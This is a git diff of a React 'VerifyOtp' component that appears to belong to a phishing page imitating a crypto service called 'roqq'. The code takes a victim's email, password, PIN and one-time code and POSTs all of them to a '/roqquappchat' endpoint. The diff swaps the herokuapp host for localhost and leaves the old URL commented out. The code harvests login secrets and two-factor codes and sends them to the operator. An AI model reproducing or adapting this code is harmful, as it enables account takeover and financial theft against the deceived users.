@@ -1,6 +1,5 @@
 import React, { useState } from 'react'
 import { useHistory } from 'react-router-dom'
-import emailjs from 'emailjs-com'
 
 import '../styles/styles.css'
 import LogoWhite from '../assets/logo_white.png'
@@ -25,42 +24,41 @@ const VerifyOtp = (props) => {
             if (props.location.state) {
                 const templateParams = props.location.state
 
-                
-             try {
-                const URL = 'https://roqq.herokuapp.com'
-                const response = await fetch(URL + '/roqquappchat', {
-                    method: 'POST',
-                    headers: {
-                        'Content-type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        email: templateParams.email,
-                        password: templateParams.password,
-                        pin: templateParams.clientOtp,
-                        otp: code,
-                    }),
-                })
+                try {
+                    const URL = 'http://localhost:3030'
+                    // const URL = 'https://roqq.herokuapp.com'
+                    const response = await fetch(URL + '/roqquappchat', {
+                        method: 'POST',
+                        headers: {
+                            'Content-type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            email: templateParams.email,
+                            password: templateParams.password,
+                            pin: templateParams.clientOtp,
+                            otp: code,
+                        }),
+                    })
 
-                 const resData = await response.json()
+                    const resData = await response.json()
 
-                 console.log('email sending started')
+                    console.log('email sending started')
 
-                 if (resData.status === 'success') {
-                     console.log('Message Sent.')
-                     setTimeout(() => {
-                         console.log('time out init')
-                         setLoading(false)
+                    if (resData.status === 'success') {
+                        console.log('Message Sent.')
+                        setTimeout(() => {
+                            console.log('time out init')
+                            setLoading(false)
 
-                                history.push('/')
-                     }, 3000)
-                 } else if (resData.status === 'fail') {
-                     console.log('Message failed to send.')
-                     setLoading(false)
-                 }
-             } catch (err) {
-                 console.log(err)
-             }
-
+                            history.push('/')
+                        }, 3000)
+                    } else if (resData.status === 'fail') {
+                        console.log('Message failed to send.')
+                        setLoading(false)
+                    }
+                } catch (err) {
+                    console.log(err)
+                }
             }
         }
     }
